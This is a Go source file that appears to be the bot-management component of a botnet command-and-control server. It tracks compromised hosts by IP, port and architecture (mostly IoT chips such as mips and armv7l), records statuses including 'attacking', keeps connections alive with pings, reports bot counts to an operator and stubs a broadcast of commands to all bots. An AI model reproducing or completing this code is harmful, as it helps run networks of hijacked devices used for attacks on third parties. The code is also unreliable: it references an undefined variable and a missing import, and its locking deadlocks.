package main

import (
	"encoding/json"
	"fmt"
	"net"
	"os"
	"sync"
	"time"
)

// Bot structure
type Bot struct {
	ID         string    `json:"id"`
	IP         string    `json:"ip"`
	Port       int       `json:"port"`
	Arch       string    `json:"arch"`
	Connected  time.Time `json:"connected"`
	LastPing   time.Time `json:"last_ping"`
	Status     string    `json:"status"` // online, offline, attacking
}

// BotManager handles all bot operations
type BotManager struct {
	Bots     map[string]*Bot
	Mutex    sync.RWMutex
	Filename string
}

// Global bot manager
var botManager = &BotManager{
	Bots:     make(map[string]*Bot),
	Filename: "data/bots.json",
}

// Load bots from file
func (bm *BotManager) Load() error {
	bm.Mutex.Lock()
	defer bm.Mutex.Unlock()

	file, err := os.ReadFile(bm.Filename)
	if err != nil {
		if os.IsNotExist(err) {
			// Create empty file
			bm.saveToFile()
			return nil
		}
		return err
	}

	var bots []*Bot
	if err := json.Unmarshal(file, &bots); err != nil {
		return err
	}

	bm.Bots = make(map[string]*Bot)
	for _, bot := range bots {
		bm.Bots[bot.ID] = bot
	}

	return nil
}

// Save bots to file
func (bm *BotManager) saveToFile() error {
	bm.Mutex.RLock()
	defer bm.Mutex.RUnlock()

	var bots []*Bot
	for _, bot := range bm.Bots {
		bots = append(bots, bot)
	}

	data, err := json.MarshalIndent(bots, "", "  ")
	if err != nil {
		return err
	}

	return os.WriteFile(bm.Filename, data, 0644)
}

// Add a new bot
func (bm *BotManager) Add(ip string, port int, arch string) string {
	bm.Mutex.Lock()
	defer bm.Mutex.Unlock()

	id := fmt.Sprintf("%s:%d", ip, port)

	// Check if bot already exists
	if _, exists := bm.Bots[id]; exists {
		// Update last ping
		bm.Bots[id].LastPing = time.Now()
		bm.Bots[id].Status = "online"
		return id
	}

	// Create new bot
	bot := &Bot{
		ID:         id,
		IP:         ip,
		Port:       port,
		Arch:       arch,
		Connected:  time.Now(),
		LastPing:   time.Now(),
		Status:     "online",
	}

	bm.Bots[id] = bot
	bm.saveToFile()

	return id
}

// Remove a bot
func (bm *BotManager) Remove(id string) {
	bm.Mutex.Lock()
	defer bm.Mutex.Unlock()

	delete(bm.Bots, id)
	bm.saveToFile()
}

// Get bot by ID
func (bm *BotManager) Get(id string) *Bot {
	bm.Mutex.RLock()
	defer bm.Mutex.RUnlock()

	return bm.Bots[id]
}

// Get all bots
func (bm *BotManager) GetAll() []*Bot {
	bm.Mutex.RLock()
	defer bm.Mutex.RUnlock()

	var bots []*Bot
	for _, bot := range bm.Bots {
		bots = append(bots, bot)
	}
	return bots
}

// Get count by architecture
func (bm *BotManager) GetArchCounts() map[string]int {
	bm.Mutex.RLock()
	defer bm.Mutex.RUnlock()

	counts := make(map[string]int)
	for _, bot := range bm.Bots {
		counts[bot.Arch]++
	}
	return counts
}

// Update bot status
func (bm *BotManager) UpdateStatus(id string, status string) {
	bm.Mutex.Lock()
	defer bm.Mutex.Unlock()

	if bot, exists := bm.Bots[id]; exists {
		bot.Status = status
		bot.LastPing = time.Now()
		bm.saveToFile()
	}
}

// Update bot ping
func (bm *BotManager) Ping(id string) {
	bm.Mutex.Lock()
	defer bm.Mutex.Unlock()

	if bot, exists := bm.Bots[id]; exists {
		bot.LastPing = time.Now()
		if bot.Status == "offline" {
			bot.Status = "online"
		}
		bm.saveToFile()
	}
}

// Check for offline bots (no ping for 30 seconds)
func (bm *BotManager) CheckOffline() {
	bm.Mutex.Lock()
	defer bm.Mutex.Unlock()

	now := time.Now()
	for id, bot := range bm.Bots {
		if now.Sub(bot.LastPing) > 30*time.Second {
			bot.Status = "offline"
		}
	}
	bm.saveToFile()
}

// Start the offline checker
func (bm *BotManager) StartOfflineChecker() {
	ticker := time.NewTicker(10 * time.Second)
	go func() {
		for range ticker.C {
			bm.CheckOffline()
		}
	}()
}

// Show bots to client
func showBots(conn net.Conn) {
	bm.Load()
	bots := bm.GetAll()
	counts := bm.GetArchCounts()

	conn.Write([]byte(fmt.Sprintf("\nConnected Bots: %d\n", len(bots))))
	
	archs := []string{"x86_64", "armv7l", "armv8l", "aarch64", "mips", "mipsel", "ppc", "unknown"}
	for _, arch := range archs {
		if count, exists := counts[arch]; exists {
			conn.Write([]byte(fmt.Sprintf("  %s: %d\n", arch, count)))
		} else {
			conn.Write([]byte(fmt.Sprintf("  %s: 0\n", arch)))
		}
	}

	// Show last 10 bots
	if len(bots) > 0 {
		conn.Write([]byte("\nLast 10 bots:\n"))
		showCount := 10
		if len(bots) < 10 {
			showCount = len(bots)
		}
		for i := len(bots) - showCount; i < len(bots); i++ {
			bot := bots[i]
			conn.Write([]byte(fmt.Sprintf("  %s | %s | %s | %s\n", 
				bot.ID, bot.Arch, bot.Status, bot.Connected.Format("15:04:05"))))
		}
	} else {
		conn.Write([]byte("\n  No bots connected.\n"))
	}

	conn.Write([]byte("\n"))
}

// Add bot handler for connections
func handleBotConnection(conn net.Conn, arch string) {
	ip := conn.RemoteAddr().String()
	
	// Parse IP and port
	host, portStr, err := net.SplitHostPort(ip)
	if err != nil {
		conn.Close()
		return
	}
	
	port := 0
	fmt.Sscanf(portStr, "%d", &port)

	// Add to bot manager
	botManager.Load()
	botID := botManager.Add(host, port, arch)
	botManager.saveToFile()

	// Keep connection alive
	go func() {
		ticker := time.NewTicker(5 * time.Second)
		for range ticker.C {
			// Send ping to bot
			_, err := conn.Write([]byte("PING\n"))
			if err != nil {
				botManager.UpdateStatus(botID, "offline")
				conn.Close()
				return
			}
		}
	}()

	// Handle incoming messages
	buf := make([]byte, 1024)
	for {
		n, err := conn.Read(buf)
		if err != nil {
			botManager.UpdateStatus(botID, "offline")
			conn.Close()
			return
		}

		msg := string(buf[:n])
		if strings.TrimSpace(msg) == "PONG" {
			botManager.Ping(botID)
		}
	}
}

// Broadcast to all bots
func broadcastToBots(msg string) {
	botManager.Mutex.RLock()
	defer botManager.Mutex.RUnlock()

	for id, bot := range botManager.Bots {
		if bot.Status == "online" {
			// TODO: Send to actual connection
			fmt.Printf("[*] Sending to %s: %s\n", id, msg)
		}
	}
}